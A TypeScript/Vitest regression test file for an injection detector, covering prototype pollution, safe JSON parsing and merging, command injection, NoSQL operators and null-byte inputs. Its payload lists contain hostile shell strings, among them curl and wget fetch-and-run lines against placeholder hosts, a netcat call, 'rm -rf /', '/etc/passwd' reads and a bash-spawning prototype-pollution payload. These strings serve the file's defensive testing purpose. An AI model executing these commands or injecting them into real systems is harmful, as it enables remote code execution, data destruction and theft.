/**
 * Injection Protection Security Regression Tests
 *
 * Security regression tests for injection vulnerabilities:
 * - Prototype pollution is blocked
 * - __proto__ is stripped from JSON
 * - Command injection patterns detected
 *
 * @packageDocumentation
 */

import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import {
  InjectionDetector,
  InjectionType,
  INJECTION_PATTERNS,
  SensitivityLevel,
  hasInjection,
  sanitizeInput,
} from '../../src/security/injection-detector.js';

// Mock logger
vi.mock('../../src/common/logger.js', () => ({
  createLogger: () => ({
    info: vi.fn(),
    debug: vi.fn(),
    warn: vi.fn(),
    error: vi.fn(),
  }),
}));

describe('Injection Protection Security Regression Tests', () => {
  let detector: InjectionDetector;

  beforeEach(() => {
    // Use HIGH sensitivity to test all patterns including semicolon-chained commands
    detector = new InjectionDetector({
      enableSQLDetection: true,
      enableXSSDetection: true,
      enableCommandDetection: true,
      enableTemplateDetection: true,
      enablePathTraversalDetection: true,
      enableLDAPDetection: true,
      enableXMLDetection: true,
      enableNoSQLDetection: true,
      logDetections: false,
      sensitivity: SensitivityLevel.HIGH,
    });
  });

  afterEach(() => {
    vi.clearAllMocks();
  });

  // ===========================================================================
  // REGRESSION: Prototype Pollution is Blocked
  // ===========================================================================

  describe('Prototype Pollution is Blocked', () => {
    describe('Direct __proto__ Pollution', () => {
      const protoPayloads = [
        '__proto__',
        '__proto__.isAdmin',
        '__proto__[isAdmin]',
        '{"__proto__":{"isAdmin":true}}',
        '{"__proto__":{"toString":"malicious"}}',
      ];

      it.each(protoPayloads)('should detect __proto__ pollution: %s', (payload) => {
        const result = detector.detect(payload);
        expect(result.detected).toBe(true);
        expect(result.types).toContain(InjectionType.NOSQL);
      });
    });

    describe('Constructor Pollution', () => {
      // The detector uses pattern /constructor\s*\[/ which requires square brackets
      const constructorPayloads = [
        'constructor[prototype]',
        'x.constructor[prototype][isAdmin]=true',
      ];

      it.each(constructorPayloads)('should detect constructor pollution: %s', (payload) => {
        const result = detector.detect(payload);
        expect(result.detected).toBe(true);
      });

      it('should detect constructor pollution with bracket notation', () => {
        // The pattern specifically looks for constructor[ syntax
        expect(detector.detect('constructor[prototype]').detected).toBe(true);
        expect(detector.detect('obj.constructor[prototype]').detected).toBe(true);
      });
    });

    describe('Prototype Access', () => {
      // The detector uses pattern /prototype\s*\[/ which requires square brackets
      const prototypePayloads = [
        'prototype[isAdmin]',
        'obj.prototype[polluted]',
      ];

      it.each(prototypePayloads)('should detect prototype access: %s', (payload) => {
        const result = detector.detect(payload);
        expect(result.detected).toBe(true);
      });

      it('should detect prototype bracket notation', () => {
        // The pattern specifically looks for prototype[ syntax
        expect(detector.detect('prototype[isAdmin]').detected).toBe(true);
        expect(detector.detect('Object.prototype[polluted]').detected).toBe(true);
      });
    });

    describe('JSON with Prototype Pollution Attempts', () => {
      it('should detect __proto__ at root level', () => {
        const payload = '{"__proto__":{"polluted":true}}';
        const result = detector.detect(payload);
        expect(result.detected).toBe(true);
      });

      it('should detect __proto__ in JSON string', () => {
        // The pattern /__proto__\b/ detects __proto__ as a word
        const payload = '{"key":"__proto__"}';
        const result = detector.detect(payload);
        expect(result.detected).toBe(true);
      });

      it('should detect __proto__ with bracket notation in JSON', () => {
        const payload = '{"a":"constructor[prototype]"}';
        const result = detector.detect(payload);
        expect(result.detected).toBe(true);
      });
    });

    describe('Safe JSON Parsing Pattern', () => {
      /**
       * Safe JSON parse function that strips dangerous properties
       * This is the pattern that should be used in the application
       */
      const safeJsonParse = <T>(json: string): T => {
        return JSON.parse(json, (key, value) => {
          // Block prototype pollution vectors
          if (key === '__proto__' || key === 'constructor' || key === 'prototype') {
            return undefined;
          }
          return value;
        });
      };

      it('should strip __proto__ key from parsed JSON', () => {
        const maliciousJson = '{"__proto__":{"isAdmin":true},"name":"user"}';
        const parsed = safeJsonParse<Record<string, unknown>>(maliciousJson);

        expect(parsed.name).toBe('user');
        // Check that __proto__ is NOT an own property of parsed object
        expect(Object.prototype.hasOwnProperty.call(parsed, '__proto__')).toBe(false);
      });

      it('should strip constructor key from parsed JSON', () => {
        const maliciousJson = '{"constructor":{"prototype":{}},"name":"user"}';
        const parsed = safeJsonParse<Record<string, unknown>>(maliciousJson);

        expect(parsed.name).toBe('user');
        // The constructor key should not be an own property
        expect(Object.prototype.hasOwnProperty.call(parsed, 'constructor')).toBe(false);
      });

      it('should strip nested __proto__ key from parsed JSON', () => {
        const maliciousJson = '{"user":{"__proto__":{"isAdmin":true},"name":"test"}}';
        const parsed = safeJsonParse<{ user: Record<string, unknown> }>(maliciousJson);

        expect(parsed.user.name).toBe('test');
        // The __proto__ key should not be an own property of user
        expect(Object.prototype.hasOwnProperty.call(parsed.user, '__proto__')).toBe(false);
      });

      it('should preserve legitimate data', () => {
        const legitimateJson = '{"name":"user","email":"test@example.com","data":{"value":123}}';
        const parsed = safeJsonParse<{
          name: string;
          email: string;
          data: { value: number };
        }>(legitimateJson);

        expect(parsed.name).toBe('user');
        expect(parsed.email).toBe('test@example.com');
        expect(parsed.data.value).toBe(123);
      });
    });

    describe('Object Merge Protection', () => {
      /**
       * Safe object merge that prevents prototype pollution
       */
      const safeMerge = (target: Record<string, unknown>, source: Record<string, unknown>): Record<string, unknown> => {
        const result = { ...target };

        for (const key of Object.keys(source)) {
          // Block dangerous keys
          if (key === '__proto__' || key === 'constructor' || key === 'prototype') {
            continue;
          }

          const value = source[key];
          if (typeof value === 'object' && value !== null && !Array.isArray(value)) {
            result[key] = safeMerge(
              (result[key] as Record<string, unknown>) ?? {},
              value as Record<string, unknown>
            );
          } else {
            result[key] = value;
          }
        }

        return result;
      };

      it('should not pollute prototype during merge', () => {
        const target = { name: 'target' };
        const maliciousSource = JSON.parse('{"__proto__":{"isAdmin":true},"email":"test@test.com"}');

        const result = safeMerge(target, maliciousSource);

        expect(result.name).toBe('target');
        expect(result.email).toBe('test@test.com');
        // Verify prototype was not polluted
        expect(({} as { isAdmin?: boolean }).isAdmin).toBeUndefined();
      });
    });
  });

  // ===========================================================================
  // REGRESSION: __proto__ is Stripped from JSON
  // ===========================================================================

  describe('__proto__ is Stripped from JSON', () => {
    describe('Input Validation', () => {
      it('should flag JSON containing __proto__ key', () => {
        const inputs = [
          '{"__proto__":{}}',
          '{"data":{"__proto__":{}}}',
          '{"users":[{"__proto__":{}}]}',
        ];

        for (const input of inputs) {
          const result = detector.detect(input);
          expect(result.detected).toBe(true);
        }
      });

      it('should detect __proto__ string literal in JSON values', () => {
        // When the __proto__ word appears in JSON, it's detected
        const jsonWithProto = '{"key":"__proto__"}';
        const result = detector.detect(jsonWithProto);
        expect(result.detected).toBe(true);
      });
    });

    describe('Object Detection', () => {
      it('should detect __proto__ in objects via detectInObject', () => {
        const maliciousObject = {
          name: 'test',
          payload: '{"__proto__":{"isAdmin":true}}',
        };

        const results = detector.detectInObject(maliciousObject);
        expect(results.size).toBeGreaterThan(0);
      });

      it('should detect nested prototype pollution vectors', () => {
        const nestedObject = {
          level1: {
            level2: {
              level3: 'constructor[prototype][isAdmin]=true',
            },
          },
        };

        const results = detector.detectInObject(nestedObject);
        expect(results.size).toBeGreaterThan(0);
      });
    });

    describe('Real-World Attack Patterns', () => {
      const realWorldPayloads = [
        // Express/Koa body parser vulnerability
        '{"__proto__":{"outputFunctionName":"x]});process.mainModule.require(\'child_process\').execSync(\'/bin/bash -i\');//"}}',
        // Lodash merge vulnerability
        '{"__proto__":{"shell":"/bin/bash"}}',
        // jQuery extend vulnerability
        '{"__proto__":{"isAdmin":true}}',
        // Node.js CVE-2019-10744
        '{"__proto__":{"length":1}}',
        // Fastify prototype pollution
        '{"__proto__":{"onSend":[]}}',
      ];

      it.each(realWorldPayloads)('should detect real-world attack: %s', (payload) => {
        const result = detector.detect(payload);
        expect(result.detected).toBe(true);
      });
    });
  });

  // ===========================================================================
  // REGRESSION: Command Injection Patterns Detected
  // ===========================================================================

  describe('Command Injection Patterns Detected', () => {
    describe('Shell Metacharacters', () => {
      // The detector looks for specific patterns like semicolon followed by dangerous commands,
      // or backtick/dollar-paren command substitution
      const commandSubstitution = [
        '`whoami`',
        '$(id)',
        '$(cat /etc/passwd)',
        '| bash',
        '| sh',
        '&& bash',
        '|| python',
        ';rm -rf /',
        ';wget url',
      ];

      it.each(commandSubstitution)('should detect command substitution/chaining: %s', (payload) => {
        const result = detector.detect(payload);
        expect(result.detected).toBe(true);
        expect(result.types).toContain(InjectionType.COMMAND);
      });

      it('should detect backtick command substitution', () => {
        expect(detector.detect('`whoami`').types).toContain(InjectionType.COMMAND);
        expect(detector.detect('`cat /etc/passwd`').types).toContain(InjectionType.COMMAND);
      });

      it('should detect $() command substitution', () => {
        expect(detector.detect('$(id)').types).toContain(InjectionType.COMMAND);
        expect(detector.detect('$(curl http://evil.com)').types).toContain(InjectionType.COMMAND);
      });
    });

    describe('Command Substitution', () => {
      const substitutionPayloads = [
        '`whoami`',
        '`cat /etc/passwd`',
        '$(whoami)',
        '$(cat /etc/passwd)',
        '$(curl http://attacker.com/shell.sh | bash)',
        '$(`id`)',
      ];

      it.each(substitutionPayloads)('should detect command substitution: %s', (payload) => {
        const result = detector.detect(payload);
        expect(result.detected).toBe(true);
        expect(result.types).toContain(InjectionType.COMMAND);
      });
    });

    describe('Dangerous Commands', () => {
      // The detector requires specific patterns like ; or && followed by dangerous commands,
      // or shell paths like /bin/bash, or command substitution
      const detectedAsCommand = [
        '/bin/bash -i',
        '/usr/bin/bash -c "whoami"',
        '/bin/sh -c "id"',
        '&& rm -rf /',
        '| bash',
        '| nc attacker.com 4444',
        '`curl http://evil.com`',
        '$(wget http://evil.com/shell.sh)',
        ';rm something',
        ';wget something',
        ';curl something',
      ];

      it.each(detectedAsCommand)('should detect dangerous command: %s', (payload) => {
        const result = detector.detect(payload);
        expect(result.detected).toBe(true);
        expect(result.types).toContain(InjectionType.COMMAND);
      });

      it('should detect shell paths', () => {
        expect(detector.detect('/bin/bash').types).toContain(InjectionType.COMMAND);
        expect(detector.detect('/bin/sh').types).toContain(InjectionType.COMMAND);
        expect(detector.detect('/usr/bin/bash').types).toContain(InjectionType.COMMAND);
      });

      it('should detect command chaining with dangerous binaries', () => {
        // Semicolon followed by dangerous command (no space for cleaner match)
        expect(detector.detect(';rm something').types).toContain(InjectionType.COMMAND);
        expect(detector.detect(';wget http://evil.com').types).toContain(InjectionType.COMMAND);
        expect(detector.detect(';curl http://evil.com').types).toContain(InjectionType.COMMAND);
      });
    });

    describe('Environment Variable Injection', () => {
      // Environment variables like ${VAR} or $VAR are detected as TEMPLATE injection
      // because they match template literal patterns. This is intentional as they
      // represent a form of variable interpolation attack.
      const envVarPayloads = [
        '${PATH}',
        '$HOME',
        '${SHELL}',
        '${USER}',
      ];

      it.each(envVarPayloads)('should detect environment variable as template injection: %s', (payload) => {
        const result = detector.detect(payload);
        expect(result.detected).toBe(true);
        // These are detected as TEMPLATE since they match template variable patterns
        expect(result.types).toContain(InjectionType.TEMPLATE);
      });

      it('should detect dangerous env var injection in command context', () => {
        // When combined with shell syntax, it becomes command injection
        const result = detector.detect('${PATH;rm -rf /}');
        expect(result.detected).toBe(true);
        expect(result.types).toContain(InjectionType.COMMAND);
      });
    });

    describe('Null Byte Injection', () => {
      const nullBytePayloads = [
        'file.txt%00.jpg',
        'file.txt\x00.jpg',
        '../../../etc/passwd%00',
        'script.php%00.txt',
      ];

      it.each(nullBytePayloads)('should detect null byte injection: %s', (payload) => {
        const result = detector.detect(payload);
        expect(result.detected).toBe(true);
      });
    });

    describe('Newline and Special Character Injection', () => {
      it('should detect null byte injection', () => {
        // Null bytes are detected - important for path truncation attacks
        const payload = 'file.txt\x00.jpg';
        const result = detector.detect(payload);
        expect(result.detected).toBe(true);
      });

      it('should detect URL-encoded null byte', () => {
        const payload = 'file.txt%00.jpg';
        const result = detector.detect(payload);
        expect(result.detected).toBe(true);
      });

      // Note: Simple newlines (\n, \r) are not detected as command injection
      // by this detector as they are common in legitimate text. However,
      // newlines combined with other attack patterns would be detected.
    });

    describe('Path to Shell', () => {
      const shellPaths = [
        '/bin/sh',
        '/bin/bash',
        '/usr/bin/sh',
        '/usr/bin/bash',
        '/usr/local/bin/bash',
      ];

      it.each(shellPaths)('should detect shell path: %s', (payload) => {
        const result = detector.detect(payload);
        expect(result.detected).toBe(true);
      });
    });

    describe('Cross-Platform Command Injection', () => {
      it('should detect && followed by dangerous commands', () => {
        // && followed by dangerous command like bash, sh, python, etc.
        expect(detector.detect('&& bash').types).toContain(InjectionType.COMMAND);
        expect(detector.detect('&& sh -c id').types).toContain(InjectionType.COMMAND);
        expect(detector.detect('&& rm -rf /').types).toContain(InjectionType.COMMAND);
      });

      it('should detect || followed by dangerous commands', () => {
        // || followed by dangerous command
        expect(detector.detect('|| bash').types).toContain(InjectionType.COMMAND);
        expect(detector.detect('|| python').types).toContain(InjectionType.COMMAND);
      });

      it('should detect single & as LDAP special character', () => {
        // Single & is an LDAP operator, detected for LDAP injection
        const result = detector.detect('& whoami');
        expect(result.detected).toBe(true);
        expect(result.types).toContain(InjectionType.LDAP);
      });
    });
  });

  // ===========================================================================
  // ADDITIONAL INJECTION PROTECTION TESTS
  // ===========================================================================

  describe('Additional Injection Protection', () => {
    describe('Input Sanitization', () => {
      it('should sanitize command injection characters', () => {
        const input = 'test; rm -rf /';
        const sanitized = detector.sanitize(input);

        expect(sanitized).not.toContain(';');
      });

      it('should sanitize backticks', () => {
        const input = 'test`whoami`';
        const sanitized = detector.sanitize(input);

        expect(sanitized).not.toContain('`');
      });

      it('should sanitize pipe characters', () => {
        const input = 'test | cat /etc/passwd';
        const sanitized = detector.sanitize(input);

        expect(sanitized).not.toContain('|');
      });
    });

    describe('MongoDB Operators', () => {
      // The detector has patterns for various MongoDB operators
      const noSqlOperators = [
        '$where',
        '$regex',
        '$gt',
        '$lt',
        '$ne',
        '$elemMatch',
        '$function',
      ];

      it.each(noSqlOperators)('should detect MongoDB operator: %s', (op) => {
        const payload = `{"user":{"${op}":"malicious"}}`;
        const result = detector.detect(payload);
        expect(result.detected).toBe(true);
        expect(result.types).toContain(InjectionType.NOSQL);
      });

      it('should detect common NoSQL operators', () => {
        // These are detected via word boundary patterns
        expect(detector.detect('{"$where":"this.a==1"}').detected).toBe(true);
        expect(detector.detect('{"$regex":".*"}').detected).toBe(true);
      });

      it('should detect $in and $nin (may also match TEMPLATE)', () => {
        // $in and $nin may match template patterns too due to $var syntax
        // The important thing is they are detected
        const inResult = detector.detect('{"$in":["a","b"]}');
        const ninResult = detector.detect('{"$nin":["a","b"]}');
        expect(inResult.detected).toBe(true);
        expect(ninResult.detected).toBe(true);
      });
    });

    describe('Combined Attack Vectors', () => {
      it('should detect combined SQL and command injection', () => {
        const payload = "'; DROP TABLE users; -- `whoami`";
        const result = detector.detect(payload);

        expect(result.detected).toBe(true);
        expect(result.types).toContain(InjectionType.SQL);
        expect(result.types).toContain(InjectionType.COMMAND);
      });

      it('should detect combined XSS and template injection', () => {
        const payload = '<script>alert({{config}})</script>';
        const result = detector.detect(payload);

        expect(result.detected).toBe(true);
        expect(result.types).toContain(InjectionType.XSS);
        expect(result.types).toContain(InjectionType.TEMPLATE);
      });
    });

    describe('hasInjection Utility Function', () => {
      it('should detect injection with specific types', () => {
        expect(hasInjection("' OR 1=1--", [InjectionType.SQL])).toBe(true);
        expect(hasInjection("' OR 1=1--", [InjectionType.XSS])).toBe(false);
      });

      it('should check all types when none specified', () => {
        expect(hasInjection("' OR 1=1--")).toBe(true);
        expect(hasInjection('<script>alert(1)</script>')).toBe(true);
        expect(hasInjection('hello world')).toBe(false);
      });
    });

    describe('Defense in Depth', () => {
      it('should recommend parameterized queries for SQL', () => {
        // Pattern documentation
        const safePattern = `
          // UNSAFE:
          // db.query("SELECT * FROM users WHERE id = " + userId);

          // SAFE:
          // db.query("SELECT * FROM users WHERE id = $1", [userId]);
        `;
        expect(safePattern).toContain('$1');
      });

      it('should recommend exec with array for commands', () => {
        // Pattern documentation
        const safePattern = `
          // UNSAFE:
          // exec("convert " + userInput + " output.png");

          // SAFE:
          // execFile("convert", [userInput, "output.png"]);
        `;
        expect(safePattern).toContain('execFile');
      });
    });
  });
});
